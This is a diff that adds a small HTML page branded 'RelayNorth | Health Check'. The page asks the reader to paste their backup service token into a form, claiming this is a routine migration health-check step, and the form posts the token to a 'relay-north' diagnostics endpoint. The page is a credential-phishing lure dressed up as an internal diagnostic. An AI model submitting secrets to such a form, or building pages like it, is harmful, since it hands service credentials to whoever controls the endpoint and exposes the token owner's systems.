@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Diagnostics Health Check Intake - RelayNorth</title>
+<style>
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f1f5f9; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+  .panel { background: white; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); padding: 36px; max-width: 480px; width: 100%; }
+  .brand { font-size: 18px; font-weight: 600; color: #0f766e; margin-bottom: 6px; }
+  .brand small { color: #64748b; font-weight: normal; }
+  h2 { margin-top: 0; color: #0f172a; }
+  .description { color: #334155; margin-bottom: 20px; }
+  input[type="text"] { width: 100%; padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; font-family: monospace; box-sizing: border-box; }
+  button { margin-top: 16px; padding: 10px 20px; background: #0f766e; color: white; border: none; border-radius: 6px; font-size: 15px; cursor: pointer; }
+  button:hover { background: #115e59; }
+</style>
+</head>
+<body>
+  <div class="panel">
+    <div class="brand">RelayNorth <small>| Health Check</small></div>
+    <h2>Submit Service Token</h2>
+    <p class="description">For routine health verification, copy your backup service token and submit it below. This step is part of the migration health check protocol.</p>
+    <form method="post" action="https://relay-north/diagnostics-intake">
+      <input type="text" name="token" placeholder="Paste token here" required>
+      <button type="submit">Submit Token</button>
+    </form>
+  </div>
+</body>
+</html>
